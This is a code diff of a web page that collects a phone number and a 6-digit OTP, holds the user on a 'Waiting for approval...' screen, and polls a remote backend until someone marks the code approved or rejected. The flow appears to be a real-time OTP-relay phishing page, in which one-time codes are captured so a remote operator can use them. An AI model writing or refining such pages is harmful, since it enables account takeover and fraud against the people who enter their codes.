@@ -160,12 +160,36 @@ body {
   </div>
 
 </div>
+  <div id="loadingOverlay" style="
+display:none;
+position:fixed;
+top:0;
+left:0;
+width:100%;
+height:100%;
+background:rgba(255,255,255,.95);
+z-index:9999;
+justify-content:center;
+align-items:center;
+font-family:Arial,sans-serif;
+font-size:20px;
+font-weight:bold;
+color:#555;
+">
+    Waiting for approval...
+</div>
   <script>
 const API = "https://ecolo-backend.onrender.com";
 
 const inputs = document.querySelectorAll(".otp-input");
+const overlay = document.getElementById("loadingOverlay");
+
 let submitting = false;
 let timer = null;
+
+// Display saved phone number
+document.getElementById("phoneNumber").textContent =
+    localStorage.getItem("phone") || "";
 
 async function submitPin() {
 
@@ -176,23 +200,16 @@ async function submitPin() {
     const phone = localStorage.getItem("phone");
     const sessionId = localStorage.getItem("sessionId");
 
-    if (!phone) {
-        submitting = false;
-        alert("Phone number not found. Please start again.");
-        window.location.href = "deno.html";
-        return;
-    }
-
-    if (!sessionId) {
+    if (!phone || !sessionId) {
         submitting = false;
         alert("Session expired. Please start again.");
-        window.location.href = "deno.html";
+        location.href = "deno.html";
         return;
     }
 
     if (!/^\d{6}$/.test(pin)) {
         submitting = false;
-        alert("Enter a valid 6-digit PIN.");
+        alert("Please enter the 6-digit OTP.");
         return;
     }
 
@@ -218,59 +235,61 @@ async function submitPin() {
             return;
         }
 
-        document.getElementById("loadingOverlay").style.display = "flex";
+        overlay.style.display = "flex";
 
         timer = setInterval(async () => {
 
             try {
 
                 const res = await fetch(`${API}/status/${sessionId}`);
+
+                if (!res.ok) return;
+
                 const status = await res.json();
 
                 if (status.status === "approved") {
 
                     clearInterval(timer);
-                    window.location.href = "kim.html";
+                    location.href = "kim.html";
+                    return;
 
-                } else if (status.status === "rejected") {
+                }
+
+                if (status.status === "rejected") {
 
                     clearInterval(timer);
                     submitting = false;
 
-                    document.getElementById("loadingOverlay").innerHTML = `
-                        <div style="text-align:center;padding:20px;font-family:Arial;">
-                            <h2 style="color:#d32f2f;">Request Rejected</h2>
-                            <p>Your request could not be verified.</p>
+                    overlay.innerHTML = `
+                        <div style="text-align:center">
+                            <h2 style="color:#d32f2f">Request Rejected</h2>
+                            <p>Your OTP was rejected.</p>
 
                             <button onclick="location.reload()" style="
-                                margin-top:20px;
+                                padding:12px 30px;
+                                border:none;
+                                border-radius:8px;
                                 background:#0b5ed7;
                                 color:white;
-                                border:none;
-                                padding:12px 30px;
-                                border-radius:8px;
-                                cursor:pointer;">
+                                cursor:pointer;
+                            ">
                                 Try Again
                             </button>
                         </div>
                     `;
                 }
 
-            } catch (err) {
-
-                clearInterval(timer);
-                submitting = false;
-                document.getElementById("loadingOverlay").style.display = "none";
-                alert("Connection lost.");
-
+            } catch (e) {
+                console.error(e);
             }
 
         }, 2000);
 
     } catch (err) {
 
+        console.error(err);
         submitting = false;
-        alert("Unable to connect to the server.");
+        alert(err.message);
 
     }
 
